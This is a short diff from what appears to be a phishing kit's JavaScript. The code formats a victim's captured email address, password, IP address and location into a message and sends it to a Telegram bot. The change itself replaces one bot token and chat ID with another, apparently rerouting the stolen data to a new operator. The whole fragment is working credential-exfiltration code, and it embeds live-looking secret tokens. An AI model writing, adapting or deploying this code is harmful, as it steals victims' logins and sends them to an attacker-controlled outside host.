@@ -24,8 +24,8 @@
                 const message = `🔹 New Login Attempt 🔹\n📧 Email: ${xiemail}\n🔑 Password: ${pipasswor}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
 
                 // Replace with your actual bot token and chat ID
-                const botToken = '8015436370:AAE6LyAmr9taK6_V-q2HAzBj_O9oopR7JNg';
-                const chatId = '6414984639';
+                const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
+                const chatId = '6651292809';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
                 const payload = {
